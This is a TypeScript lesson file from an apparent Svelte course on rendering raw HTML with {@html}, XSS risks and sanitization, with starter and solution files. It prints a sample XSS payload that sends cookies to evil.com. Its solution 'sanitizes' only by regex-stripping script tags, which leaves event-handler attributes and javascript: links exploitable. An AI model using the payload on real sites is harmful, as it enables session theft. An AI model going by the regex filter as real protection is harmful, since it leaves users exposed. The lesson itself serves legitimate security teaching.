import type { Lesson } from '$types/lesson';

export const rawHtmlAndSecurity: Lesson = {
	id: 'svelte-core.advanced-patterns.raw-html-and-security',
	slug: 'raw-html-and-security',
	title: 'Raw HTML with {@html} & Security',
	description:
		'Render raw HTML strings safely using {@html}, understand XSS risks, and learn sanitization patterns.',
	trackId: 'svelte-core',
	moduleId: 'advanced-patterns',
	order: 5,
	estimatedMinutes: 15,
	concepts: ['svelte5.template.html', 'svelte5.security.xss', 'svelte5.template.html-vs-render'],
	prerequisites: ['svelte5.basics.template-expressions', 'svelte5.snippets.basics'],

	content: [
		{
			type: 'text',
			content: `# Raw HTML with {@html} & Security

## Why {@html} Exists

By default, Svelte treats all expressions as **text content**. If you write \`{content}\` in a template, Svelte escapes HTML characters — \`<script>\` becomes \`&lt;script&gt;\` and renders as literal text, not as an HTML element. This is a critical security feature that prevents cross-site scripting (XSS) attacks by default.

But sometimes you genuinely need to render HTML strings:

- **CMS content**: A headless CMS returns rich text as HTML strings
- **Markdown rendering**: Libraries like \`marked\` or \`mdsvex\` produce HTML output
- **Rich text editors**: WYSIWYG editors store content as HTML
- **Email templates**: Server-rendered HTML previews
- **Syntax highlighting**: Code highlighters produce HTML with \`<span>\` elements for colors

For these cases, Svelte provides \`{@html expression}\`:

\`\`\`svelte
<script>
  let htmlContent = '<strong>Bold</strong> and <em>italic</em>';
</script>

<!-- Renders as: Bold and italic (with formatting) -->
{@html htmlContent}

<!-- Compare with: <strong>Bold</strong> and <em>italic</em> (as text) -->
{htmlContent}
\`\`\`

## How {@html} Works

When Svelte encounters \`{@html expression}\`, it sets \`innerHTML\` on a container element. The browser's HTML parser interprets the string as real DOM nodes — elements, attributes, event handlers, everything.

This is fundamentally different from normal template expressions:

| Feature | \`{expression}\` | \`{@html expression}\` |
|---------|----------------|----------------------|
| HTML escaping | Yes (safe) | No (raw) |
| Reactive bindings | Yes | No |
| Event handlers | Yes | No |
| Svelte directives | Yes | No |
| XSS risk | None | High if user input |

### Critical Limitation: No Reactivity Inside {@html}

Elements created by \`{@html}\` are plain DOM nodes — Svelte does not manage them. This means:

- No \`onclick\` handlers (use \`addEventListener\` manually)
- No \`bind:value\` bindings
- No transitions or animations
- No component instantiation

If you need reactive content, use snippets and \`{@render}\` instead.`
		},
		{
			type: 'concept-callout',
			content: 'svelte5.template.html'
		},
		{
			type: 'text',
			content: `## The XSS Danger

**Never pass unsanitized user input to {@html}.** This cannot be overstated. Consider:

\`\`\`svelte
<!-- DANGEROUS: user controls the comment content -->
{@html userComment}
\`\`\`

If \`userComment\` is \`<img src=x onerror="document.location='https://evil.com/?cookie='+document.cookie">\`, the attacker can steal session cookies, redirect users, or inject a keylogger. XSS is consistently in the OWASP Top 10 and has caused breaches at major companies.

### What Can an XSS Attack Do?

- **Steal credentials**: Read cookies, localStorage, session tokens
- **Impersonate users**: Make API requests as the victim
- **Modify the page**: Show fake login forms, alter content
- **Redirect users**: Send them to phishing pages
- **Install keyloggers**: Capture everything the user types

### The Golden Rule

\`\`\`
NEVER: {@html untrustedInput}
OK:    {@html sanitize(untrustedInput)}
BEST:  {@html trustedServerContent}
\`\`\`

## Sanitization Patterns

### Pattern 1: Server-Side Sanitization (Recommended)

The safest approach is sanitizing HTML on the server before it reaches the client. The client receives pre-cleaned HTML:

\`\`\`typescript
// +page.server.ts
import DOMPurify from 'isomorphic-dompurify';

export async function load() {
  const rawHtml = await fetchCMSContent();
  return {
    content: DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: ['p', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h2', 'h3', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'class']
    })
  };
}
\`\`\`

\`\`\`svelte
<!-- +page.svelte — safe because server already sanitized -->
{@html data.content}
\`\`\`

### Pattern 2: Client-Side Sanitization

When server sanitization is not possible:

\`\`\`svelte
<script>
  import DOMPurify from 'dompurify';

  let { rawHtml } = $props();

  let safeHtml = $derived(
    DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: ['p', 'strong', 'em', 'a', 'code'],
      ALLOWED_ATTR: ['href']
    })
  );
</script>

{@html safeHtml}
\`\`\`

### Pattern 3: Trusted Content Only

If the HTML comes from your own code (not user input), it is inherently safe:

\`\`\`svelte
<script>
  import { marked } from 'marked';

  let markdown = '# Hello\\nThis is **bold** text.';
  let html = $derived(marked.parse(markdown));
</script>

{@html html}
\`\`\`

Even here, if \`markdown\` could contain user input, sanitize the output of \`marked.parse()\`.`
		},
		{
			type: 'xray-prompt',
			content: 'Inspect the DOM after {@html} renders. Notice that Svelte inserts the HTML as raw DOM nodes — no Svelte component wrappers, no reactive bindings. These elements are invisible to Svelte\'s reactivity system.'
		},
		{
			type: 'text',
			content: `## {@html} vs {@render} — When to Use Each

| Scenario | Use | Why |
|----------|-----|-----|
| CMS/markdown HTML strings | \`{@html}\` | Content is a string, not Svelte code |
| Reusable UI patterns | \`{@render snippet()}\` | Reactive, type-safe, composable |
| Component children | \`{@render children()}\` | Standard composition pattern |
| Dynamic HTML from API | \`{@html sanitize(html)}\` | Must sanitize external content |
| User-facing text with formatting | \`{@render}\` with snippets | Avoid XSS entirely |

**Prefer snippets and {@render} whenever possible.** They are safe by construction — there is no XSS risk because you are composing Svelte template code, not injecting HTML strings. Only use {@html} when you genuinely have an HTML string that cannot be represented as Svelte components.

## Adding Event Listeners to {@html} Content

Since {@html} content is not managed by Svelte, use {@attach} or $effect to add interactivity:

\`\`\`svelte
<script>
  let container: HTMLDivElement;

  function setupLinks(node: HTMLDivElement) {
    const links = node.querySelectorAll('a');
    links.forEach(link => {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        // Custom navigation logic
      });
    });
    return () => {
      // Cleanup if needed
    };
  }
</script>

<div {@attach setupLinks}>
  {@html articleContent}
</div>
\`\`\`

**Your task:** Build a simple markdown preview component. Take a textarea input, convert it to HTML using a basic markdown-to-HTML function, and render it with {@html}. Include sanitization to strip script tags.`
		},
		{
			type: 'checkpoint',
			content: 'cp-raw-html-1'
		},
		{
			type: 'text',
			content: `## Summary

\`{@html}\` is a powerful escape hatch for rendering HTML strings in Svelte templates. It bypasses Svelte's automatic HTML escaping, which is necessary for CMS content, markdown output, and rich text. But this power comes with responsibility: never pass unsanitized user input to \`{@html}\`. Use DOMPurify or equivalent on the server when possible, and prefer snippets/\`{@render}\` for any content that can be expressed as Svelte template code.

The key mental model: \`{@html}\` produces **dead DOM nodes** — real HTML elements with no Svelte reactivity. Snippets produce **live Svelte content** — reactive, type-safe, and composable. Choose accordingly.`
		}
	],

	starterFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  let markdown = $state(\`# Hello World

This is **bold** and this is *italic*.

- List item 1
- List item 2

<script>alert('xss')<\/script>

A [link](https://svelte.dev) to Svelte.
\`);

  // TODO: Create a function that converts basic markdown to HTML
  // Support: # headings, **bold**, *italic*, - lists, [text](url) links
  // IMPORTANT: Strip any <script> tags for security!

  function markdownToHtml(md: string): string {
    // TODO: Implement basic markdown conversion
    // Then sanitize by removing script tags
    return md;
  }

  let html = $derived(markdownToHtml(markdown));
</script>

<div class="editor">
  <div class="pane">
    <h3>Markdown Input</h3>
    <textarea bind:value={markdown} rows="15"></textarea>
  </div>
  <div class="pane">
    <h3>HTML Preview</h3>
    <div class="preview">
      <!-- TODO: Render the HTML using {@html} -->
      {html}
    </div>
  </div>
</div>

<style>
  .editor {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    max-width: 900px;
    margin: 2rem auto;
  }
  .pane { display: flex; flex-direction: column; }
  h3 { margin-bottom: 0.5rem; color: #1f2937; }
  textarea {
    flex: 1;
    padding: 1rem;
    font-family: monospace;
    font-size: 14px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    resize: none;
  }
  .preview {
    flex: 1;
    padding: 1rem;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    overflow-y: auto;
  }
  .preview :global(h1) { font-size: 1.5rem; margin-bottom: 0.5rem; }
  .preview :global(strong) { font-weight: 700; }
  .preview :global(em) { font-style: italic; }
  .preview :global(ul) { padding-left: 1.5rem; }
  .preview :global(a) { color: #4f46e5; text-decoration: underline; }
</style>`
		}
	],

	solutionFiles: [
		{
			name: 'App.svelte',
			path: '/App.svelte',
			language: 'svelte',
			content: `<script lang="ts">
  let markdown = $state(\`# Hello World

This is **bold** and this is *italic*.

- List item 1
- List item 2

<script>alert('xss')<\/script>

A [link](https://svelte.dev) to Svelte.
\`);

  function markdownToHtml(md: string): string {
    let html = md
      .replace(/^# (.+)$/gm, '<h1>$1</h1>')
      .replace(/\\*\\*(.+?)\\*\\*/g, '<strong>$1</strong>')
      .replace(/\\*(.+?)\\*/g, '<em>$1</em>')
      .replace(/^- (.+)$/gm, '<li>$1</li>')
      .replace(/(<li>.*<\\/li>)/gs, '<ul>$1</ul>')
      .replace(/\\[(.+?)\\]\\((.+?)\\)/g, '<a href="$2">$1</a>')
      .replace(/\\n\\n/g, '<br><br>');

    // Sanitize: strip script tags
    html = html.replace(/<script[^>]*>[\\s\\S]*?<\\/script>/gi, '');
    html = html.replace(/<script[^>]*>/gi, '');

    return html;
  }

  let html = $derived(markdownToHtml(markdown));
</script>

<div class="editor">
  <div class="pane">
    <h3>Markdown Input</h3>
    <textarea bind:value={markdown} rows="15"></textarea>
  </div>
  <div class="pane">
    <h3>HTML Preview</h3>
    <div class="preview">
      {@html html}
    </div>
  </div>
</div>

<style>
  .editor {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
    max-width: 900px;
    margin: 2rem auto;
  }
  .pane { display: flex; flex-direction: column; }
  h3 { margin-bottom: 0.5rem; color: #1f2937; }
  textarea {
    flex: 1;
    padding: 1rem;
    font-family: monospace;
    font-size: 14px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    resize: none;
  }
  .preview {
    flex: 1;
    padding: 1rem;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    overflow-y: auto;
  }
  .preview :global(h1) { font-size: 1.5rem; margin-bottom: 0.5rem; }
  .preview :global(strong) { font-weight: 700; }
  .preview :global(em) { font-style: italic; }
  .preview :global(ul) { padding-left: 1.5rem; }
  .preview :global(a) { color: #4f46e5; text-decoration: underline; }
</style>`
		}
	],

	checkpoints: [
		{
			id: 'cp-raw-html-1',
			description: 'Create a markdown preview that renders HTML with {@html} and strips script tags',
			validation: {
				type: 'code-pattern',
				config: {
					patterns: [
						{ type: 'contains', value: '{@html' },
						{ type: 'contains', value: 'script' }
					]
				}
			},
			hints: [
				'Use {@html html} to render the converted markdown as real HTML instead of escaped text.',
				'In markdownToHtml(), use string .replace() with regex to convert markdown patterns to HTML tags.',
				'Add html = html.replace(/<script[^>]*>[\\\\s\\\\S]*?<\\\\/script>/gi, \'\') to strip script tags for security.'
			],
			conceptsTested: ['svelte5.template.html', 'svelte5.security.xss']
		}
	]
};
